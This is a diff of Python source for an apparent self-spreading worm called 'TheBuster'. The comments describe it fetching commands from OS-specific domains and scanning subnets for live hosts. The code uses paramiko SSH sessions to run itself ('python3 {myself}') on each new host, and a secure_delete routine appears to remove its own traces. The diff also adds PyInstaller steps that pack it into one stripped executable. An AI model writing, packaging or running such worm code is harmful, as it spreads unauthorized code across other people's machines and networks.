@@ -38,12 +38,16 @@ class ExtClass:
 
         print("No valid IP address found.")
 
-(ExtClass().get_own_ip())
+ext_class_instance = ExtClass()
+ext_class_instance.get_own_ip()
 
 # According to the host operating system (Linux/Windows) the wrm is running on,
 # it differentiates which domain to contact to get the right commands to run.
 # It uses an externally hosted python class to determine the current subnet
 # to scan for alive hosts and populate itself further.
+
+Compile with PyInstaller:
+pyinstaller --onefile --clean --strip --name thebuster --hidden-import=dns.rdtypes.ANY.TXT --hidden-import=dns.rdtypes.ANY --hidden-import=dns.rdtypes.IN --hidden-import=_cffi_backend 0.8.1.py
 """
 
 import paramiko
@@ -266,7 +270,7 @@ class TheBuster:
 
                     print("Connected to target and executing 'some stuff'..\n")
                     client.exec_command('echo "Got first base.." > gotcha.txt')
-                    
+
                     # Starting the script on the new host to run from there and explore
                     # Comment out to stop the script from spreading further
                     client.exec_command(f"python3 {myself}")
@@ -303,6 +307,7 @@ class TheBuster:
     # --------------------------------------------------------------------------------------
 
     def secure_delete(self):
+
         script_path = os.path.abspath(sys.argv[0])
 
         if self.IS_WINDOWS:
